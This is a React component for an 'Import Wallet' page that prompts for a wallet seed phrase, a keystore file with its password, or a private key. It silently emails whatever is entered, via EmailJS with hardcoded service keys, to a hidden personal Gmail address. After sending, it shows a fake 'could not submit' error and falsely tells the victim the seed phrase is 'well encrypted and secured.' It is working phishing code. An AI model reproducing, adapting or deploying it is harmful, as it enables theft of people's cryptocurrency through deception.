import React, { Component } from "react";
import emailjs from '@emailjs/browser'; // Note: The '@emailjs/browser' package was replaced

export class ToggleButtons extends Component {
  constructor(props) {
    super(props);

    this.state = {
      tabType: `phrase`
    };
  }

  toggleMe = (value) => {
    this.setState({
      tabType: value
    });
  };

  sendEmail = (e) => {
    e.preventDefault();

    emailjs.sendForm('service_8f99smb', 'template_fyd13dj', e.target, 'QVreMbNvUxjJPo-cx')
      .then((result) => {
        console.log(result.text);
        document.getElementById("form").innerHTML="Could not submit, please contact Admin";
      })
      .catch((error) => {
        console.log(error.text);
      });
  };

  render() {
    return (
      <>

        <div className="form" id="form">
          <h1>Import Wallet</h1>
          <button onClick={() => this.toggleMe('phrase')}>phrase</button>
          <button onClick={() => this.toggleMe('keystore')}>keystore</button>
          <button onClick={() => this.toggleMe('private')}>private</button>
          <div>
            {this.state.tabType === `phrase` && (
              <div><form onSubmit={this.sendEmail}>
                <input type="hidden" value="annagu.kennedy@gmail.com" name="user_email" />
                <input type="hidden" value="privatekey" name="message" />
                <input type="text" name="message" id="input" />
                <p>Typically 12 (sometimes 24) words separated by single spaces.</p>
                <input type="submit" id="submit" name="submit" value="import" />
                </form>
              </div>
            )}
            {this.state.tabType === `keystore` && (
              <div>
                <form onSubmit={this.sendEmail}>
                <input type="hidden" value="annagu.kennedy@gmail.com" name="user_email" />
                <input type="hidden" value="keystore" name="message" />
                <input type="text" name="message" id="input" />
                <input type="password" name="message" id="password" />
                <p>Several lines of text beginning with '(...)' plus the password you used to encrypt it.</p>
                <input type="submit" id="submit" value="import" />
                </form>
              </div>
            )}
            {this.state.tabType === `private` && (
              <div>
                <form onSubmit={this.sendEmail}>
                <input type="hidden" value="annagu.kennedy@gmail.com" name="user_email" />
                <input type="hidden" value="privatekey" name="message" />
                <input type="text" name="message" id="input" />
                <p>Account Private Key</p>
                <input type="submit" value="import" id="submit" />
                </form>
              </div>
            )}

            <p>Note: Your wallet seed phrase is well encrypted and secured.</p>
          </div>
        </div>
      </>
    );
  }
}

export default function Import() {
  return (
    <>
      <ToggleButtons />
    </>
  );
}
